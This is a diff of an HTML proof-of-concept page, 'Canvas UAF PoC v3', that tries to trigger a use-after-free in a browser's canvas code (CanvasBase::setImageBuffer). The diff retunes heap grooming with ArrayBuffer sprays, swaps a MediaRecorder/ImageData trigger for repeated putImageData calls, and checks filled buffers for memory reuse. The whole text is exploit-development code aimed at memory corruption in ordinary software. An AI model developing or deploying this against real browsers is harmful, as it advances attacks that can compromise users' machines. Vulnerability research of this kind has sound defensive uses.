@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Canvas UAF PoC v2</title>
+    <title>Canvas UAF PoC v3</title>
     <style>
         #trigger {
             margin: 20px;
@@ -20,15 +20,15 @@
     </style>
 </head>
 <body>
-    <h1>Canvas UAF PoC v2</h1>
+    <h1>Canvas UAF PoC v3</h1>
     <p>Click to trigger UAF in CanvasBase::setImageBuffer.</p>
     <button id="trigger">Trigger UAF</button>
     <canvas id="canvas" width="100" height="100"></canvas>
     <script>
         function setupMemoryCheck() {
             const buffers = [];
-            for (let i = 0; i < 50; i++) {
-                const buf = new ArrayBuffer(4096); // 4KB
+            for (let i = 0; i < 100; i++) {
+                const buf = new ArrayBuffer(2048); // 2KB
                 const view = new Uint8Array(buf);
                 view.fill(0x46); // Fill with 0x46
                 buffers.push(view);
@@ -50,10 +50,10 @@
             alert('Initiating PoC...');
             try {
                 // Heap grooming
-                alert('Grooming heap with 200x256KB buffers...');
+                alert('Grooming heap with 100x128KB buffers...');
                 const groom = [];
-                for (let i = 0; i < 200; i++) {
-                    const buf = new ArrayBuffer(256 * 1024); // 256KB
+                for (let i = 0; i < 100; i++) {
+                    const buf = new ArrayBuffer(128 * 1024); // 128KB
                     const view = new Uint8Array(buf);
                     view.fill(0x41);
                     groom.push(view);
@@ -61,37 +61,40 @@
 
                 // Initialize memory checker
                 const check = setupMemoryCheck();
-                alert('Memory checker initialized (50x4KB buffers with 0x46).');
+                alert('Memory checker initialized (100x2KB buffers with 0x46).');
 
-                // Create canvas and capture stream
-                alert('Creating canvas and capturing stream...');
+                // Create canvas and context
+                alert('Creating canvas and context...');
                 const canvas = document.getElementById('canvas');
-                const stream = canvas.captureStream();
-                const options = {};
-                const recorder = new MediaRecorder(stream, options);
+                const ctx = canvas.getContext('2d');
 
-                // Create sensitive objects
-                alert('Creating sensitive objects...');
-                const textarea = document.createElement('textarea');
-                const cols = textarea.cols;
-                const imageDataSettings = {};
+                // Create ImageData
+                alert('Creating ImageData...');
+                const imageData = ctx.createImageData(100, 100);
+                const data = imageData.data;
+                data.fill(0xFF); // Fill with known value
+
                 setTimeout(() => {
                     try {
-                        // Check memory before ImageData
+                        // Check memory before manipulation
                         const before = check();
-                        alert(`Memory before ImageData: ${before}`);
+                        alert(`Memory before manipulation: ${before}`);
 
-                        // Trigger UAF with ImageData
-                        alert('Attempting ImageData creation...');
-                        new ImageData(recorder.videoBitsPerSecond || 100, cols, imageDataSettings);
+                        // Attempt to trigger UAF
+                        alert('Attempting to trigger UAF with putImageData...');
+                        for (let i = 0; i < 100; i++) {
+                            ctx.putImageData(imageData, 0, 0); // Repeated calls
+                            const tempData = ctx.createImageData(50, 50); // Allocate more
+                            tempData.data.fill(0x48); // Try to overwrite
+                        }
 
                         // Check memory after
                         const after = check();
-                        alert(`Memory after ImageData: ${after}`);
+                        alert(`Memory after manipulation: ${after}`);
                     } catch (err) {
                         alert(`Error: ${err.message}`);
                     }
-                }, 500);
+                }, 600);
             } catch (err) {
                 alert(`Initial error: ${err.message}`);
             }
